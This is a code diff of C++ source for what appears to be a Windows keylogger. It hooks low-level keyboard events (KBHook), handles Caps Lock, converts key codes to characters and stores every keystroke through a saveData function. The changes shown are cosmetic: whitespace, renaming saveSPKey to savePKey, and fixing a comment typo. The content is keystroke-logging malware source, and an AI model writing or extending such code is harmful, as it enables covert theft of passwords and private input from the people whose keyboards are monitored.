@@ -17,14 +17,14 @@ int save(char kbdChar, bool capsLock){
             break;
         case false:
             std::cout << "char : " << kbdChar << std::endl;
-           saveData(std::string(1, std::tolower(kbdChar)));
+            saveData(std::string(1, std::tolower(kbdChar)));
             break;
     }
 
     return 0;
 }
 
-int saveSPKey(std::string specialKey){
+int savePKey(std::string specialKey){
     std::cout << "char : " << specialKey << std::endl;
     saveData(specialKey);
 
@@ -44,7 +44,7 @@ LRESULT CALLBACK KBHook(int nCode, WPARAM wParam, LPARAM lParam){
         int vkCode = KBDLLStruct->vkCode;
         
         if(GetKeyState(VK_CAPITAL)){
-            //CAPSLOCK is ONq
+            //CAPSLOCK is ON
             std::cout << "CAPSLOCK is ON" << std::endl;
             bool capsLock = true;
             char kbdChar = cnvToChar(vkCode);
